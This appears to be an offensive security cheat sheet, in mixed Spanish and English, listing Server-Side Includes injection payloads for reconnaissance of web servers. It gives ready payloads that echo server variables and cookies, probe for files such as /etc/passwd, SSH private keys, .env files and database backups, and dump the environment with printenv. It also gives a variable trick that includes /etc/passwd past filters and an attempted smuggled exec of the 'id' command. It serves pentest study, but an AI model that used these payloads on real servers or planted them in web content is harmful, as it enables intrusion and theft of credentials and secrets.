---
aliases:
  - SSI Echo Vars
  - SSI Fingerprint
  - SSI Filesystem Enum
  - SSI printenv
tags:
  - type/cheatsheet
  - vuln/ssi
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Server-Side Includes (SSI) Injection]]'
---
# SSI - Information Gathering

***

## `#echo` Environment Variables

| **Variable** | **Payload** | **Info extraída** |
|:---:|:---:|:---:|
| Date local | `<!--#echo var="DATE_LOCAL" -->` | Server fecha (PoC). |
| Date GMT | `<!--#echo var="DATE_GMT" -->` | UTC time. |
| Document name | `<!--#echo var="DOCUMENT_NAME" -->` | Filename del .shtml. |
| Document URI | `<!--#echo var="DOCUMENT_URI" -->` | URI del archivo. |
| Document root | `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot abs path. |
| Last modified | `<!--#echo var="LAST_MODIFIED" -->` | mtime del archivo actual. |
| Server software | `<!--#echo var="SERVER_SOFTWARE" -->` | Apache/IIS version. |
| Server name | `<!--#echo var="SERVER_NAME" -->` | Hostname. |
| Server protocol | `<!--#echo var="SERVER_PROTOCOL" -->` | HTTP/1.1. |
| Server port | `<!--#echo var="SERVER_PORT" -->` | 80/443. |
| Request method | `<!--#echo var="REQUEST_METHOD" -->` | GET/POST. |
| Request URI | `<!--#echo var="REQUEST_URI" -->` | Full URL con query. |
| Script filename | `<!--#echo var="SCRIPT_FILENAME" -->` | Abs path del script. |
| Remote address | `<!--#echo var="REMOTE_ADDR" -->` | Client IP. |
| Remote user | `<!--#echo var="REMOTE_USER" -->` | Auth HTTP user. |
| User-Agent | `<!--#echo var="HTTP_USER_AGENT" -->` | UA string. |
| Cookie | `<!--#echo var="HTTP_COOKIE" -->` | Cookies enviadas. |
| Referer | `<!--#echo var="HTTP_REFERER" -->` | Referer header. |
| Path info | `<!--#echo var="PATH_INFO" -->` | Extra path. |
| Query string | `<!--#echo var="QUERY_STRING" -->` | Raw query. |
| Custom var (set first) | `<!--#set var="x" value="hello" --><!--#echo var="x" -->` | Variables definidas. |
^ssi-info-echo

___

## `#fsize` y `#flastmod` (Filesystem Enum)

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| File size | `<!--#fsize file="/etc/passwd" -->` | Size en bytes/KB/MB. |
| File last modified | `<!--#flastmod file="/etc/passwd" -->` | Timestamp. |
| Existence probe | If error → file NOT exists/readable | Existence oracle. |
| Bulk enum filesystem | Loop multiple file paths | Enumeration. |
| Identify backup files | `.bak`, `.old`, `.swp` | OSINT. |
| Identify log files | `/var/log/*` | Standard. |
| Identify config files | `/etc/*`, `/var/www/*` | Discovery. |
| Identify SSH keys | `/home/*/.ssh/*` | Sensitive. |
| Without leaking content | Useful when `#include` blocked | Defense bypass. |
| Combine con timing | Slow read = exists, fast 404 = no | Timing oracle. |
| `#config sizefmt` | Customize size format | UI adjust. |
| `#config timefmt` | Customize time format | UI adjust. |
| Static list iteration | Manual loop with multiple `#fsize` calls | Bulk. |
| Error message default | `[an error occurred while processing this directive]` | Standard error. |
| Custom error message | `<!--#config errmsg="ERROR" -->` | Cleaner output. |
^ssi-info-fsize

### Filesystem enum sin leakear contenido

```html
<!-- Probe: existence + size only -->
<!--#fsize file="/etc/passwd" -->         <!-- 2847 → exists, readable -->
<!--#fsize file="/root/.ssh/id_rsa" -->   <!-- error → not readable -->
<!--#fsize file="/var/backups/db.sql" --> <!-- 82412 → exists -->
<!--#fsize file="/var/www/html/.env" -->  <!-- 1234 → exists -->

<!-- Modified time -->
<!--#flastmod file="/etc/passwd" -->      <!-- Mon, 01 Jan 2025 -->
<!--#flastmod file="/var/log/auth.log" --> <!-- Recent → activity hint -->
```

___

## `#printenv` y `#config`

| **Directive** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Print all env vars | `<!--#printenv -->` | Full dump. |
| Set custom variable | `<!--#set var="x" value="hello" -->` | Define local var. |
| Set with reference | `<!--#set var="path" value="$DOCUMENT_ROOT/admin" -->` | Var interpolation. |
| Echo defined var | `<!--#echo var="x" -->` | Display set var. |
| Config size format | `<!--#config sizefmt="bytes" -->` | Affects fsize output. |
| Config size format abbrev | `<!--#config sizefmt="abbrev" -->` | Default. |
| Config time format | `<!--#config timefmt="%Y-%m-%d %H:%M" -->` | Custom strftime. |
| Config error message | `<!--#config errmsg="custom error" -->` | Replace default. |
| Conditional flow | `<!--#if expr="..." --><!--#endif -->` | Branching (Apache). |
| Else branch | `<!--#else -->` | Within if. |
| Elif branch | `<!--#elif expr="..." -->` | Multi-branch. |
| Endif | `<!--#endif -->` | Close if. |
| Variable comparison | `<!--#if expr="$REMOTE_USER = admin" -->` | Conditional logic. |
| Combine con set + include | `<!--#set var="p" value="/etc/passwd" --><!--#include file="$p" -->` | Filter bypass. |
^ssi-info-printenv

### Combine printenv + post-processing

```html
<!-- Full env dump -->
<!--#printenv -->

<!-- Format-controlled output -->
<!--#config timefmt="%Y-%m-%d %H:%M:%S" -->
<!--#flastmod file="/etc/passwd" -->

<!-- Conditional based on env -->
<!--#if expr="${HTTPS} = on" -->
  <p>HTTPS active</p>
<!--#else -->
  <p>HTTP only</p>
<!--#endif -->

<!-- Set variable for filter bypass -->
<!--#set var="cmd_action" value="exec" -->
<!--#set var="target" value="id" -->
<!--# $cmd_action cmd="$target" -->
```

***
